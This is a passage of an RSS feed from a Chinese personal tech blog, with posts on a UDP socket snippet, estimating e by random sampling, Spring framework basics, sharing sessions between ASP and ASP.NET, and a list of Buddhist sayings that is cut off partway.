-1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;oops("socket");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memset((void*)&amp;addr, 0, sizeof(addr));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;addr.sin_family = AF_INET;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;addr.sin_port = htons(10000);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;addr.sin_addr.s_addr = inet_addr("192.201.0.255");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sendto(sockid, packet, sizeof(packet), 0,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(struct sockaddr *)&amp;addr, sizeof(addr));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;close(sockid);<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 0;<br>}</div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720091112101516694/</guid>
    </item>
    <item>
      <title>
<![CDATA[一种计算e的方法]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720108811316123/</link>
      <description>
<![CDATA[原理：平均e个(0,1)之间的随机数之和会大于1.<br>原因：n个数之和小于1的概率是1/n!，则n个数之和大于1的概率则是1-1/n!；<br>恰好n个数之后大于1的概率，等于n个数之后大于1的概率减去n-1个数之和大于1的概率，即<br>(1-1/n!) - (1-1/(n-1)!) = (n-1)/n!<br>则n的期望为<br>sum( (n-1)/n! * n ) = sum( (n-1)/(n-1)! ) = sum(n/n!)<br>又因为sum(n/n!)=e，所以平均e个(0,1)之间随机数之和大于1.<br>代码如下：可惜收敛较慢，效率较低。<br>#!/usr/bin/python<br>'''A method to calculate e<br>'''<br>__author__ = "hankjin&lt;hankjin@163.com&gt;"<br>import random,math<br>def calce(iter=1000000):<br>&nbsp;&nbsp;&nbsp; ''' calculate math.e with &lt;iter&gt; iterations.<br>&nbsp;&nbsp;&nbsp; '''<br>&nbsp;&nbsp;&nbsp; res=0<br>&nbsp;&nbsp;&nbsp; for i in range(iter):<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tmp=0.0<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while tmp&lt;1:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; res+=1<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tmp+=random.random()<br>&nbsp;&nbsp;&nbsp; return float(res)/iter<br>if __name__=='__main__':<br>&nbsp;&nbsp;&nbsp; print('real e=', math.e)<br>&nbsp;&nbsp;&nbsp; print('calculated e=%s', calce())]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Math</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720108811316123/</guid>
    </item>
    <item>
      <title>
<![CDATA[Spring 初级知识]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200832511336492/</link>
      <description>
<![CDATA[<P>Step1。容器</P>
<P>step2.依赖.txt</P>
<P>step3.bean作用域.txt</P>
<P>step4.AOP面向切面编程.txt</P>
<P>Step1。容器</P>
<P>1. 实例化容器3种<BR>Resource resource = new FileSystemResource("beans.xml");<BR>BeanFactory factory = new XmlBeanFactory(resource);<BR>... 或...</P>
<P>ClassPathResource resource = new ClassPathResource("beans.xml");<BR>BeanFactory factory = new XmlBeanFactory(resource);<BR>... 或...</P>
<P>ApplicationContext context = new ClassPathXmlApplicationContext(<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; new String[] {"applicationContext.xml", "applicationContext-part2.xml"});<BR>// of course, an ApplicationContext is just a BeanFactory<BR>BeanFactory factory = (BeanFactory) context;</P>
<P>2.容器方法6种<BR>boolean containsBean(String)：如果BeanFactory包含给定名称的bean定义(或bean实例)，则返回true</P>
<P>Object getBean(String)：返回以给定名字注册的bean实例。根据bean的配置情况，如果为singleton模式将返回一个共享的实例，否则将返回一个新建的实例。如果没有找到指定的bean，该方法可能会抛出BeansException异常(实际上将抛出NoSuchBeanDefinitionException异常)，在对bean进行实例化和预处理时也可能抛出异常</P>
<P>Object getBean(String, Class)：返回以给定名称注册的bean实例，并转换为给定class类型的实例，如果转换失败，相应的异常(BeanNotOfRequiredTypeException)将被抛出。上面的getBean(String)方法也适用该规则。</P>
<P>Class getType(String name)：返回给定名称的bean的Class。如果没有找到指定的bean实例，则抛出NoSuchBeanDefinitionException异常。</P>
<P>boolean isSingleton(String)：判断给定名称的bean定义(或bean实例)是否为singleton模式(singleton将在bean的作用域中讨论)，如果bean没找到，则抛出NoSuchBeanDefinitionException异常。</P>
<P>String[] getAliases(String)：返回给定bean名称的所有别名。</P>
<P>3.XML<BR>&lt;beans&gt;&lt;import resource="services.xml"/&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;import resource="resources/messageSource.xml"/&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;import resource="/resources/themeSource.xml"/&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;bean id="bean1" class="..."/&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;bean id="bean2" class="..."/&gt;<BR>&nbsp; &lt;/beans&gt;<BR>3.1 new<BR>&lt;bean id="exampleBean" class="examples.ExampleBean"/&gt;<BR>3.2 static create<BR>&lt;bean id="exampleBean"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; class="examples.ExampleBean2"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; factory-method="createInstance"/&gt;<BR>3.3 alias<BR>&lt;alias name="componentA-dataSource" alias="componentB-dataSource"/&gt;<BR></P>
<P>step2.依赖.txt</P>
<P>1. Setter注入<BR>&lt;bean id="exampleBean" class="examples.ExampleBean"&gt;</P>
<P>&nbsp; &lt;!-- setter injection using the nested &lt;ref/&gt; element --&gt;<BR>&nbsp; &lt;property name="beanOne"&gt;&lt;ref bean="anotherExampleBean"/&gt;&lt;/property&gt;</P>
<P>&nbsp; &lt;!-- setter injection using the neater 'ref' attribute --&gt;<BR>&nbsp; &lt;property name="beanTwo" ref="yetAnotherBean"/&gt;<BR>&nbsp; &lt;property name="integerProperty" value="1"/&gt;<BR>&lt;/bean&gt;</P>
<P>&lt;bean id="anotherExampleBean" class="examples.AnotherBean"/&gt;<BR>&lt;bean id="yetAnotherBean" class="examples.YetAnotherBean"/&gt;<BR>public class ExampleBean {</P>
<P>&nbsp;&nbsp;&nbsp; private AnotherBean beanOne;<BR>&nbsp;&nbsp;&nbsp; private YetAnotherBean beanTwo;<BR>&nbsp;&nbsp;&nbsp; private int i;</P>
<P>&nbsp;&nbsp;&nbsp; public void setBeanOne(AnotherBean beanOne) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.beanOne = beanOne;<BR>&nbsp;&nbsp;&nbsp; }</P>
<P>&nbsp;&nbsp;&nbsp; public void setBeanTwo(YetAnotherBean beanTwo) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.beanTwo = beanTwo;<BR>&nbsp;&nbsp;&nbsp; }</P>
<P>&nbsp;&nbsp;&nbsp; public void setIntegerProperty(int i) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.i = i;<BR>&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; <BR>}</P>
<P>2.构造器注入<BR>&lt;bean id="exampleBean" class="examples.ExampleBean"&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;!-- constructor injection using the nested &lt;ref/&gt; element --&gt;<BR>&nbsp; &lt;constructor-arg&gt;&lt;ref bean="anotherExampleBean"/&gt;&lt;/constructor-arg&gt;<BR>&nbsp; <BR>&nbsp; &lt;!-- constructor injection using the neater 'ref' attribute --&gt;<BR>&nbsp; &lt;constructor-arg ref="yetAnotherBean"/&gt;<BR>&nbsp; <BR>&nbsp; &lt;constructor-arg type="int" value="1"/&gt;<BR>&lt;/bean&gt;<BR>&nbsp; &lt;bean id="anotherExampleBean" class="examples.AnotherBean"/&gt;<BR>&lt;bean id="yetAnotherBean" class="examples.YetAnotherBean"/&gt;<BR>public class ExampleBean {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private AnotherBean beanOne;<BR>&nbsp;&nbsp;&nbsp; private YetAnotherBean beanTwo;<BR>&nbsp;&nbsp;&nbsp; private int i;<BR>&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; public ExampleBean(<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; AnotherBean anotherBean, YetAnotherBean yetAnotherBean, int i) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.beanOne = anotherBean;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.beanTwo = yetAnotherBean;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.i = i;<BR>&nbsp;&nbsp;&nbsp; }<BR>}</P>
<P>other。 其他<BR>&lt;bean id="exampleBean" class="examples.ExampleBean"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; factory-method="createInstance"&gt;<BR>&nbsp; &lt;constructor-arg ref="anotherExampleBean"/&gt;<BR>&nbsp; &lt;constructor-arg ref="yetAnotherBean"/&gt;<BR>&nbsp; &lt;constructor-arg value="1"/&gt; <BR>&lt;/bean&gt;</P>
<P>&lt;bean id="anotherExampleBean" class="examples.AnotherBean"/&gt;<BR>&lt;bean id="yetAnotherBean" class="examples.YetAnotherBean"/&gt;<BR>public class ExampleBean {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // a private constructor<BR>&nbsp;&nbsp;&nbsp; private ExampleBean(...) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ...<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; // a static factory method; the arguments to this method can be<BR>&nbsp;&nbsp;&nbsp; // considered the dependencies of the bean that is returned,<BR>&nbsp;&nbsp;&nbsp; // regardless of how those arguments are actually used.<BR>&nbsp;&nbsp;&nbsp; public static ExampleBean createInstance (<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; AnotherBean anotherBean, YetAnotherBean yetAnotherBean, int i) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ExampleBean eb = new ExampleBean (...);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // some other operations<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ...<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return eb;<BR>&nbsp;&nbsp;&nbsp; }<BR>}<BR></P>
<P>step3.bean作用域.txt</P>
<P>Spring Framework支持五种作用域（其中有三种只能用在基于web的Spring ApplicationContext）。<BR>&nbsp;singleton&nbsp; 在每个Spring IoC容器中一个bean定义对应一个对象实例。<BR>&nbsp;prototype 一个bean定义对应多个对象实例。<BR>&nbsp;request 在一次HTTP请求中，一个bean定义对应一个实例；即每次HTTP请求将会有各自的bean实例，它们依据某个bean定义创建而成。该作用域仅在基于web的Spring ApplicationContext情形下有效。<BR>&nbsp;session 在一个HTTP Session中，一个bean定义对应一个实例。该作用域仅在基于web的Spring ApplicationContext情形下有效。<BR>&nbsp;global session 在一个全局的HTTP Session中，一个bean定义对应一个实例。典型情况下，仅在使用portlet context的时候有效。该作用域仅在基于web的Spring ApplicationContext情形下有效。</P>
<P>1 根据经验，对所有有状态的bean应该使用prototype作用域，而对无状态的bean则应该使用singleton作用域。</P>
<P>Singleton作用域是Spring中的缺省作用域。要在XML中将bean定义成singleton，可以这样配置：</P>
<P>&lt;bean id="accountService" class="com.foo.DefaultAccountService"/&gt;</P>
<P>&lt;!-- the following is equivalent, though redundant (singleton scope is the default) --&gt;<BR>&lt;bean id="accountService" class="com.foo.DefaultAccountService" scope="singleton"/&gt;</P>
<P>&lt;!-- the following is equivalent, though redundant (and preserved for backward compatibility) --&gt;<BR>&lt;bean id="accountService" class="com.foo.DefaultAccountService" singleton="true"/&gt;</P>
<P><BR>2 要在XML中将bean定义成prototype，可以这样配置：</P>
<P>&lt;bean id="accountService" class="com.foo.DefaultAccountService" scope="prototype"/&gt;</P>
<P>&lt;!-- the following is equivalent too (and preserved for backward compatibility) --&gt;<BR>&lt;bean id="accountService" class="com.foo.DefaultAccountService" singleton="false"/&gt;</P>
<P>3 初始化web配置<BR>要使用request、session和 global session作用域的bean（即具有web作用域的bean），在开始设置bean定义之前，还要做少量的初始配置。请注意，假如你只想要“常规的”作用域，也就是singleton和prototype，就不需要这一额外的设置。</P>
<P>在目前的情况下，根据你的特定servlet环境，有多种方法来完成这一初始设置。如果你使用的是Servlet 2.4及以上的web容器，那么你仅需要在web应用的XML声明文件web.xml中增加下述ContextListener即可</P>
<P>&lt;web-app&gt;<BR>&nbsp; ...<BR>&nbsp; &lt;listener&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;listener-class&gt;org.springframework.web.context.request.RequestContextListener&lt;/listener-class&gt;<BR>&nbsp; &lt;/listener&gt;<BR>&nbsp; ...<BR>&lt;/web-app&gt;<BR>如果你用的是早期版本的web容器（Servlet 2.4以前），那么你要使用一个javax.servlet.Filter的实现。请看下面的web.xml配置片段：</P>
<P>&lt;web-app&gt;<BR>&nbsp; ..<BR>&nbsp; &lt;filter&gt; <BR>&nbsp;&nbsp;&nbsp; &lt;filter-name&gt;requestContextFilter&lt;/filter-name&gt; <BR>&nbsp;&nbsp;&nbsp; &lt;filter-class&gt;org.springframework.web.filter.RequestContextFilter&lt;/filter-class&gt;<BR>&nbsp; &lt;/filter&gt; <BR>&nbsp; &lt;filter-mapping&gt; <BR>&nbsp;&nbsp;&nbsp; &lt;filter-name&gt;requestContextFilter&lt;/filter-name&gt; <BR>&nbsp;&nbsp;&nbsp; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;<BR>&nbsp; &lt;/filter-mapping&gt;<BR>&nbsp; ...<BR>&lt;/web-app&gt;<BR>RequestContextListener和RequestContextFilter两个类做的都是同样的工作：将HTTP request对象绑定到为该请求提供服务的Thread。这使得具有request和session作用域的bean能够在后面的调用链中被访问到。</P>
<P>&nbsp;</P>
<P>step4.AOP面向切面编程.txt</P>
<P>Spring Framework支持五种作用域（其中有三种只能用在基于web的Spring ApplicationContext）。<BR>&nbsp;singleton&nbsp; 在每个Spring IoC容器中一个bean定义对应一个对象实例。<BR>&nbsp;prototype 一个bean定义对应多个对象实例。<BR>&nbsp;request 在一次HTTP请求中，一个bean定义对应一个实例；即每次HTTP请求将会有各自的bean实例，它们依据某个bean定义创建而成。该作用域仅在基于web的Spring ApplicationContext情形下有效。<BR>&nbsp;session 在一个HTTP Session中，一个bean定义对应一个实例。该作用域仅在基于web的Spring ApplicationContext情形下有效。<BR>&nbsp;global session 在一个全局的HTTP Session中，一个bean定义对应一个实例。典型情况下，仅在使用portlet context的时候有效。该作用域仅在基于web的Spring ApplicationContext情形下有效。</P>
<P>1 根据经验，对所有有状态的bean应该使用prototype作用域，而对无状态的bean则应该使用singleton作用域。</P>
<P>Singleton作用域是Spring中的缺省作用域。要在XML中将bean定义成singleton，可以这样配置：</P>
<P>&lt;bean id="accountService" class="com.foo.DefaultAccountService"/&gt;</P>
<P>&lt;!-- the following is equivalent, though redundant (singleton scope is the default) --&gt;<BR>&lt;bean id="accountService" class="com.foo.DefaultAccountService" scope="singleton"/&gt;</P>
<P>&lt;!-- the following is equivalent, though redundant (and preserved for backward compatibility) --&gt;<BR>&lt;bean id="accountService" class="com.foo.DefaultAccountService" singleton="true"/&gt;</P>
<P><BR>2 要在XML中将bean定义成prototype，可以这样配置：</P>
<P>&lt;bean id="accountService" class="com.foo.DefaultAccountService" scope="prototype"/&gt;</P>
<P>&lt;!-- the following is equivalent too (and preserved for backward compatibility) --&gt;<BR>&lt;bean id="accountService" class="com.foo.DefaultAccountService" singleton="false"/&gt;</P>
<P>3 初始化web配置<BR>要使用request、session和 global session作用域的bean（即具有web作用域的bean），在开始设置bean定义之前，还要做少量的初始配置。请注意，假如你只想要“常规的”作用域，也就是singleton和prototype，就不需要这一额外的设置。</P>
<P>在目前的情况下，根据你的特定servlet环境，有多种方法来完成这一初始设置。如果你使用的是Servlet 2.4及以上的web容器，那么你仅需要在web应用的XML声明文件web.xml中增加下述ContextListener即可</P>
<P>&lt;web-app&gt;<BR>&nbsp; ...<BR>&nbsp; &lt;listener&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;listener-class&gt;org.springframework.web.context.request.RequestContextListener&lt;/listener-class&gt;<BR>&nbsp; &lt;/listener&gt;<BR>&nbsp; ...<BR>&lt;/web-app&gt;<BR>如果你用的是早期版本的web容器（Servlet 2.4以前），那么你要使用一个javax.servlet.Filter的实现。请看下面的web.xml配置片段：</P>
<P>&lt;web-app&gt;<BR>&nbsp; ..<BR>&nbsp; &lt;filter&gt; <BR>&nbsp;&nbsp;&nbsp; &lt;filter-name&gt;requestContextFilter&lt;/filter-name&gt; <BR>&nbsp;&nbsp;&nbsp; &lt;filter-class&gt;org.springframework.web.filter.RequestContextFilter&lt;/filter-class&gt;<BR>&nbsp; &lt;/filter&gt; <BR>&nbsp; &lt;filter-mapping&gt; <BR>&nbsp;&nbsp;&nbsp; &lt;filter-name&gt;requestContextFilter&lt;/filter-name&gt; <BR>&nbsp;&nbsp;&nbsp; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;<BR>&nbsp; &lt;/filter-mapping&gt;<BR>&nbsp; ...<BR>&lt;/web-app&gt;<BR>RequestContextListener和RequestContextFilter两个类做的都是同样的工作：将HTTP request对象绑定到为该请求提供服务的Thread。这使得具有request和session作用域的bean能够在后面的调用链中被访问到。</P>
<P>&nbsp;</P>
<P>&nbsp;</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200832511336492/</guid>
    </item>
    <item>
      <title>
<![CDATA[如何实现Asp与Asp.Net共享Session]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372006428319490/</link>
      <description>
<![CDATA[天气:<img title="如何实现Asp与Asp.Net共享Session - hankjin - 云水居"  alt="如何实现Asp与Asp.Net共享Session - hankjin - 云水居"  src="http://img.blog.163.com/photo/bOzunJnM668KHCP8wFpfGQ==/4278982595955566812.gif"  >心情:<img title="如何实现Asp与Asp.Net共享Session - hankjin - 云水居"  alt="如何实现Asp与Asp.Net共享Session - hankjin - 云水居"  src="http://img.blog.163.com/photo/qmcxKxMQX+esO4QSENBHeQ==/5131851775388843392.gif"  ><br><p><span></span>如何实现Asp与Asp.Net共享Session&nbsp; (<a rel="nofollow" href="http://www.esoutong.com/bbs/dispbbs.asp?boardid=6&amp;id=238"  >http://www.esoutong.com/bbs/dispbbs.asp?boardid=6&amp;id=238</a>)</p><p>--------------------------------------------------------------------------------<br>&nbsp;<br>--&nbsp; 作者：esoutong<br>--&nbsp; 发布时间：2006-3-31 15:48:08</p><p>--&nbsp; 如何实现Asp与Asp.Net共享Session<br>在.net中，Session的存储机制已经与Asp的存储机制不一样，虽然可以在同一个IIS下同时运行asp与aspx，但是它们之间不能传递Session。 <br>之前大批系统应用到了asp，在升级过程中，如果完全抛弃asp来重写，一来工作量太大，二来以前的成果不能保存下来。 <br>所以微软提出了一个Session共享的解决方案，只是此文档光说明原理，并没有说具体的操作步骤，由此，我撰文描述过程。 </p><p>简单说明原理，asp与asp.net之间的Session统一存储在数据库中来实现共享 </p><p>1、创建数据表 <br>打开SQL Server查询分析器，运行以下脚本来创建数据表，数据表名为SessionState <br>if exists (select * from sysobjects where id = object_id(N\'[dbo].[SessionState]\') and OBJECTPROPERTY(id, N\'IsUserTable\') = 1) <br>drop table [dbo].[SessionState] <br>GO </p><p>create TABLE [dbo].[SessionState] ( <br>[ID] uniqueidentifier NOT NULL , <br>[Da<wbr>ta] [image] NOT NULL , <br>[Last_Accessed] [datetime] NOT NULL <br>) ON [PRIMARY] TEXTIMAGE_ON [PRIMARY] <br>GO </p><p>alter TABLE [dbo].[SessionState] WITH NOCHECK ADD <br>CONSTRAINT [PK_SessionState] PRIMARY KEY NONCLUSTERED <br>( <br>[ID] <br>) ON [PRIMARY] <br>GO </p><p>2、下载以下文件 Session.rar </p><p>将文件解压后，将产生4个文件，分别作如下操作。 <br>复制 global.asa 到系统根目录下，并打开文件，修改Application("SessionDSN") 为合适的数据库链接字符串，如果系统本身已经有了global.asa，则在此文件中添加如下Application： <br>Application("SessionDSN") = "initial catalog=SqlServerName;persist security info=False;user id=sa;password=****;packet size=4096" <br>在系统的 Web.config 文件中，添加此项 <br>&lt;add key="SessionDSN" value="da<wbr>ta source=SqlServerName;initial catalog=SessionDemoDb;persist security info=False;user id=SessionDemoDbUser;password=****;packet size=4096" /&gt; <br>并将其值修改为合适的数据库链接。 <br>将另外两个dll文件复制到系统目录下（或其他合适目录） </p><p>3、关闭IIS中Asp的Session选项 <br>打开IIS，选择站点，依次选择属性 -&gt; 主目录 -&gt; 配置 -&gt; 应用程序选项，将启用会话状况前的复选勾去除。如下图： <br>screen.width-350)this.width=screen.width-350" border=0&gt; </p><p>4、安装SessionUtility.dll <br>首先找到 gacutil.exe 文件，一般情况下在 Microsoft Visual Studio .NET 2003\\SDK\\v1.1\\Bin 目录下 <br>在命令提示符窗口中，执行 gacutil /i SessionUtility.dll，（如果执行失败，请将这两个文件的路径都写全了） </p><p>5、注册SessionUtility.dll为Com对象 <br>同样，要找到 regasm.exe 文件，一般情况下在 WINNT\\Microsoft.NET\\Framework\\v1.1.4322 目录下 <br>在命令提示符窗口中，执行 regasm.exe SessionUtility.dll /tlb:SessionUtility.tlb，（如果执行失败，请将这两个文件的路径都写全了） <br>这样就会产生出一个tlb文件，可当做普通的Com组件来调用。 </p><p>6、注册SessionManager.dll <br>这个很简单了，在命令提示符窗口中，执行regsvr32 SessionManager.dll </p><p>7、如果是NTFS格式的系统，请找到 SessionMgr.dll，右键点击，属性，将IUSR_&lt;machine_name&gt;权限设置为可读和可执行。 </p><p>至此，我们已经可以实现了Asp与Asp.net之间Session共享了，那么怎么去用 </p><p>在Asp中，我们要如下使用： <br>页面开始端 <br>Dim Session <br>Set Session = Server.createObject("SessionMgr.Session2") <br>Session("UserID") = ... <br>... <br>... <br>... <br>页面结束端 <br>Set Session = Nothing \'记得一定要释放哦 </p><p>而在Asp.net中，我们要如下使用： <br>首先，我们要添加对SessionUtility的引用 <br>然后，编码时，原来是这样的继承 public class WebForm1 : System.Web.UI.Page，修改为public class WebForm1 : MSDN.SessionPage <br>这样在编码过程中就可以使用Session("UserID")这样的形式了。 </p><p>注意：虽然Session实现了共享，但是Session的使用语法，相对于.net中新增的部分，就没有实现，毕竟要照顾asp <br>譬如Session.Remove，就不能用了。&nbsp;</p>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Admin</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372006428319490/</guid>
    </item>
    <item>
      <title>
<![CDATA[8条佛曰 66句禅语]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720095812355326/</link>
      <description>
<![CDATA[八条佛曰<br>1、佛曰：忘记并不等于从未存在，一切自在来源于选择，而不是刻意。不如放手，放下的越多，越觉得拥有的更多。<br>2、佛曰：命由己造，相由心生，世间万物皆是化相，心不动，万物皆不动，心不变，万物皆不变。<br>3、佛曰：坐亦禅，行亦禅，一花一世界，一叶一如来，春来花自青，秋至叶飘零，无穷般若心自在，语默动静体自然。<br>4、佛曰：笑着面对，不去埋怨。悠然，随心，随性，随缘。注定让一生改变的，只在百年后，那一朵花开的时间。<br>5、佛曰：刹那便是永恒（若人生了悟如佛，无悲无喜无梦无幻，无爱无恨四大皆空，生与死又有何区别。不能了，不能悟，不能舍，不能弃，参不透，舍不得。）<br>6、佛曰：不可说,不可说,一说即是错。<br>7、佛曰：一念愚即般若绝，一念智即般若生。<br>8、佛曰：菩提本无树，明镜亦非台。本来无一物，何处惹尘埃。<br>&nbsp;<br>66句禅语　<br>1. 人之所以痛苦，在于追求错误的东西。<br>2. 如果你不给自己烦恼，别人也永远不可能给你烦恼。因为你自己的内心，你放不下。<br>3. 你永远要感谢给你逆境的众生。<br>4. 你永远要宽恕众生，不论他有多坏，甚至他伤害过你，你一定要放下，才能得到真正的快乐。<br>5. 当你快乐时，你要想这快乐不是永恒的。当你痛苦时，你要想这痛苦也不是永恒的。<br>6. 今日的执著，会造成明日的后悔。<br>7. 你可以拥有爱，但不要执著，因为分离是必然的。<br>8. 不要浪费你的生命在你一定会后悔的地方上。<br>9. 你什么时候放下，什么时候就没有烦恼。<br>10. 每一种创伤，都是一种成熟。<br>11. 狂妄的人有救，自卑的人没有救，认识自己，降伏自己，改变自己，才能改变别人。<br>12. 你不要一直不满人家，你应该一直检讨自己才对。不满人家，是苦了你自己。<br>13. 一个人如果不能从内心去原谅别人，那他就永远不会心安理得。<br>14. 心中装满着自己的看法与想法的人，永远听不见别人的心声。<br>15. 毁灭人只要一句话，培植一个人却要千句话，请你多口下留情。<br>16. 根本不必回头去看咒骂你的人是谁？如果有一条疯狗咬你一口，难道你也要趴下去反咬他一口吗？<br>17. 永远不要浪费你的一分一秒，去想任何你不喜欢的人。<br>18. 请你用慈悲心和温和的态度，把你的不满与委屈说出来，别人就容易接受。<br>19. 同样的瓶子，你为什么要装毒药呢？同样的心里，你为什么要充满着烦恼呢？<br>20. 得不到的东西，我们会一直以为他是美好的，那是因为你对他了解太少，没有时间与他相处在一起。当有一天，你深入了解后，你会发现原不是你想像中的那么美好。<br>21. 活着一天，就是有福气，就该珍惜。当我哭泣我没有鞋子穿的时候，我发现有人却没有脚。<br>22. 多一分心力去注意别人，就少一分心力反省自己，你懂吗？<br>23. 憎恨别人对自己是一种很大的损失。<br>24. 每一个人都拥有生命，但并非每个人都懂得生命，乃至于珍惜生命。不了解生命的人，生命对他来说，是一种惩罚。<br>25. 情执是苦恼的原因，放下情执，你才能得到自在<br>26. 不要太肯定自己的看法，这样子比较少后悔。<br>27. 当你对自己诚实的时候，世界上没有人能够欺骗得了你。<br>28. 用伤害别人的手段来掩饰自己缺点的人，是可耻的。<br>29. 默默的关怀与祝福别人，那是一种无形的布施。<br>30. 不要刻意去猜测他人的想法，如果你没有智慧与经验的正确判断，通常都会有错误的。<br>31. 要了解一个人，只需要看他的出发点与目的地是否相同，就可以知道他是否真心的。<br>32. 人生的真理，只是藏在平淡无味之中。<br>33. 不洗澡的人，硬擦香水是不会香的。名声与尊贵，是来自于真才实学的。有德自然香。<br>34. 时间总会过去的，让时间流走你的烦恼吧！<br>35. 你硬要把单纯的事情看得很严重，那样子你会很痛苦。<br>36. 永远扭曲别人善意的人，无药可救。<br>37. 说一句谎话，要编造十句谎话来弥补，何苦呢？<br>38. 白白的过一天，无所事事，就像犯了窃盗罪一样<br>39. 广结众缘，就是不要去伤害任何一个人。<br>40. 沉默是毁谤最好的答覆。<br>41. 对人恭敬，就是在庄严你自己。<br>42. 拥有一颗无私的爱心，便拥有了一切。<br>43. 来是偶然的，走是必然的。所以你必须，随缘不变，不变随缘。<br>44. 慈悲是你最好的武器。<br>45. 只要面对现实，你才能超越现实。<br>46. 良心是每一个人最公正的审判官，你骗得了别人，却永远骗不了你自己的良心。<br>47. 不懂得自爱的人，是没有能力去爱别人的。<br>48. 有时候我们要冷静问问自已，我们在追求什么？我们活着为了什么？<br>49. 不要因为小小的争执，远离了你至亲的好友，也不要因为小小的怨恨，忘记了别人的大恩。<br>50. 感谢上苍我所拥有的，感谢上苍我所没有的。<br>51. 凡是能站在别人的角度为他人着想，这个就是慈悲。<br>52. 说话不要有攻击性，不要有杀伤力，不夸已能，不扬人恶，自然能化敌为友。<br>53. 诚实的面对你内心的矛盾和污点，不要欺骗你自己。<br>54. 因果不曾亏欠过我们什么，所以请不要抱怨。<br>55. 大多数的人一辈子只做了三件事；自欺、欺人、被人欺。<br>56. 心是最大的骗子，别人能骗你一时，而它却会骗你一辈子<br>57. 只要自觉心安，东西南北都好。如有一人未度，切莫自己逃了。<br>58. 当你手中抓住一件东西不放时，你只能拥有这件东西，如果你肯放手，你就有机会选择别的。人的心若死执自己的观念，不肯放下，那么他的智慧也只能达到某种程度而已<br>59. 如果你能够平平安安的渡过一天，那就是一种福气了。多少人在今天已经见不到明天的太阳，多少人在今天已经成了残废，多少人在今天已经失去了自由，多少人在今天已经家破人亡。<br>60. 